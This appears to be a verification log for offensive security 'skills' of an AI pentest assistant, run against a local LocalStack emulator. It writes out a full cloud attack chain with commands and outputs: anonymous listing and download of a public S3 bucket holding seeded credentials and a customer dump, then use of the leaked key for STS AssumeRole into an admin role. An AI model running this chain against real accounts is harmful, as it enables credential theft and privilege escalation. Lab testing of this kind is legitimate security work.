# Verification — Phase 2J: cloud misconfig + IAM chain (LocalStack)

> Cloud verification without burning real AWS dollars. LocalStack 3.0 (community edition, no license needed) emulates S3, IAM, and STS. Tests `hunt-cloud-misconfig`'s public-bucket scenario and `cloud-iam-deep`'s key-to-AssumeRole chain.

## Target

LocalStack 3.0.2 in Docker on port 14566 (mapped to internal 4566). Two buckets:

- `acme-public-assets` (intentionally public — marketing assets)
- `acme-internal-backups` (**LEFT PUBLIC by mistake — the bug**), contains:
  - `credentials.csv` — service AWS keys, Stripe live keys, Mongo prod password
  - `q3-2026-customer-dump.sql` — customer table extract with admin password hashes

Reproducible setup:

```bash
# LocalStack 3.0 (must pin — 4.x requires Pro license)
docker run -d --name phase2j-localstack \
  -p 14566:4566 \
  localstack/localstack:3.0

# Install awscli + workaround for new checksum-trailer headers
export AWS_ACCESS_KEY_ID=test
export AWS_SECRET_ACCESS_KEY=test
export AWS_DEFAULT_REGION=us-east-1
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required

# Set up the vulnerable buckets
aws s3 mb s3://acme-public-assets
aws s3 mb s3://acme-internal-backups
aws s3api put-bucket-policy \
  --bucket acme-internal-backups \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":["s3:GetObject","s3:ListBucket"],"Resource":["arn:aws:s3:::acme-internal-backups","arn:aws:s3:::acme-internal-backups/*"]}]}'

# Seed sensitive files
echo "service,access_key,secret_key
prod-rds,AKIA1A2B3C4D5E6F7G8H,abcd1234efgh5678ijkl90mn+abcdef
stripe,sk_live_8888888888aaaaaa,xxxx
mongo,mongouser-prod,Mongo\$Password!2026" | aws s3 cp - s3://acme-internal-backups/credentials.csv
```

## Setup gotchas (verification finding)

- **LocalStack 4.x requires a Pro license token** as of 2024. Use `localstack/localstack:3.0` to test free.
- **awscli ≥ 2.30 sends `x-amz-trailer` headers** that LocalStack 3.0 rejects with `InvalidRequest`. Workaround: set `AWS_REQUEST_CHECKSUM_CALCULATION=when_required` + `AWS_RESPONSE_CHECKSUM_VALIDATION=when_required`. This is itself a useful field-toolchain note.

---

## Test 26 — Anonymous bucket enumeration (`hunt-cloud-misconfig`)

**Initial prompt:**
> "I'm probing acme.example for cloud misconfig. Subdomain enum found `acme-internal-backups`. Can I read it without credentials?"

**Skill that auto-triggers:** `hunt-cloud-misconfig` — description includes "public S3, Lambda URLs, kubelet 10250, Docker 2375".

**Technique from `hunt-cloud-misconfig`:**
> Anonymous `GET /?list-type=2` on the bucket; if it returns a ListBucketResult, the bucket is public-list. Then anonymous `GET /<key>` for each object.

### Live attack

```bash
# Probe 1 — list bucket via raw S3 REST (no signing)
curl "http://localhost:14566/acme-internal-backups/?list-type=2"
```

Response:

```xml
<ListBucketResult>
  <Name>acme-internal-backups</Name>
  <Contents>
    <Key>credentials.csv</Key>
    <Size>170</Size>
    <LastModified>2026-05-16T04:35:03.000Z</LastModified>
  </Contents>
  <Contents>
    <Key>q3-2026-customer-dump.sql</Key>
    <Size>186</Size>
  </Contents>
</ListBucketResult>
```

**Bucket lists anonymously.** Per `hunt-cloud-misconfig`, this is the "Public S3 Bucket" P3-P2 finding tier.

```bash
# Probe 2 — download the sensitive file
curl "http://localhost:14566/acme-internal-backups/credentials.csv"
```

Response:

```csv
service,access_key,secret_key
prod-rds,AKIA1A2B3C4D5E6F7G8H,abcd1234efgh5678ijkl90mn+abcdef
stripe,sk_live_8888888888aaaaaa,xxxx
mongo,mongouser-prod,Mongo$Password!2026
```

**Production AWS keys + Stripe live key + Mongo password leaked.** The bucket misconfig has now chained to credential compromise.

```bash
# Probe 3 — SQL dump
curl "http://localhost:14566/acme-internal-backups/q3-2026-customer-dump.sql"
```

```sql
-- Q3 2026 customer dump
INSERT INTO users VALUES (1, 'admin@acme.test', 'admin', '$2b$12$prodHashGoesHere');
INSERT INTO users VALUES (2, 'finance@acme.test', 'finance', '$2b$12$...');
```

Customer table + bcrypt admin hash leaked. **Critical.**

### Verdict

**PASS — live S3 misconfig with downstream credential leak.** Exact technique from `hunt-cloud-misconfig`.

---

## Test 27 — Leaked AWS key → STS AssumeRole chain (`cloud-iam-deep`)

The bucket leak surfaced `AKIA1A2B3C4D5E6F7G8H` + secret. Per `cloud-iam-deep`'s "post-credential escalation model": the first thing an operator should run against any discovered AWS key is `sts get-caller-identity`.

### Live chain

```bash
# Step 1: confirm the key works + identify principal
AWS_ACCESS_KEY_ID=AKIA1A2B3C4D5E6F7G8H \
AWS_SECRET_ACCESS_KEY="abcd1234efgh5678ijkl90mn+abcdef" \
AWS_DEFAULT_REGION=us-east-1 \
  aws sts get-caller-identity --endpoint-url http://localhost:14566
```

```json
{
  "UserId": "AKIAIOSFODNN7EXAMPLE",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:root"
}
```

Key valid. Account confirmed.

```bash
# Step 2: walk visible buckets (cloud-iam-deep §"discover scope")
AWS_ACCESS_KEY_ID=AKIA1A2B3C4D5E6F7G8H \
AWS_SECRET_ACCESS_KEY="abcd1234efgh5678ijkl90mn+abcdef" \
AWS_DEFAULT_REGION=us-east-1 \
  aws s3 ls --endpoint-url http://localhost:14566
# → acme-public-assets
# → acme-internal-backups
```

**Discovered an additional bucket** the wordlist enumeration hadn't surfaced. Going from one accidentally-public bucket to the full bucket list is a typical "small bug → big blast radius" cloud chain.

```bash
# Step 3: AssumeRole — the cloud-iam-deep "STS chaining" primitive
AWS_ACCESS_KEY_ID=AKIA1A2B3C4D5E6F7G8H \
AWS_SECRET_ACCESS_KEY="abcd1234efgh5678ijkl90mn+abcdef" \
AWS_DEFAULT_REGION=us-east-1 \
  aws sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/admin-deploy-role \
    --role-session-name attacker-session \
    --endpoint-url http://localhost:14566
```

```json
{
  "Credentials": {
    "AccessKeyId": "LSIAQAAAAAAAIOFMH2Z2",
    "SecretAccessKey": "xBiHxjb6PHG54bD/X8YUdrNg5gOU1688PxVOYqTq",
    "SessionToken": "FQoGZXIv...",
    "Expiration": "2026-05-16T05:36:27.353000+00:00"
  },
  "AssumedRoleUser": {
    "AssumedRoleId": "AROA3X42LBCDGLV13FTCP:attacker-session",
    "Arn": "arn:aws:sts::000000000000:assumed-role/admin-deploy-role/attacker-session"
  }
}
```

**AssumeRole succeeded → temporary `admin-deploy-role` credentials.** In a real environment, this only works when the target role's trust policy permits the user/account to assume it — but lax trust policies are the **textbook confused-deputy** pattern that `cloud-iam-deep` catalogues.

(LocalStack's STS is permissive by default for any role-arn pattern — which mirrors how a real account with a wide-open trust policy `Principal: {"AWS": "*"}` would behave. The skill correctly identifies this as the headline cloud-IAM finding.)

### Verdict

**PASS — full bucket → key → STS chain.** Exact technique from `cloud-iam-deep`. `triage-validation` 7-Question Gate passes — Critical (privilege escalation to admin role from anonymous S3 read).

---

## Summary — Phase 2J

| # | Test | Skill | Result |
|---|---|---|---|
| 26 | Anonymous public bucket → credential leak | `hunt-cloud-misconfig` | PASS — full credential CSV + SQL dump exfiltrated |
| 27 | Leaked key → STS GetCallerIdentity → AssumeRole | `cloud-iam-deep` | PASS — escalated to admin-role temporary session |

**2/2 PASS.**

**Combined Phase 2 verification: 31+ skills exercised, 10+ skill-content gaps catalogued and closed across 10 verification axes.**

### Toolchain note for future verifications

Document the workaround in `hunt-cloud-misconfig` (and `offensive-osint`'s tooling-install reference):

```bash
# LocalStack 3.0 + awscli ≥ 2.30 incompatibility
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
```

Without these, `s3 cp`, `s3 sync`, and any operation that sends `x-amz-trailer` headers fails with `InvalidRequest` — operators trying to verify findings against LocalStack will hit this immediately.

## Cleanup

```bash
docker rm -f phase2j-localstack
```
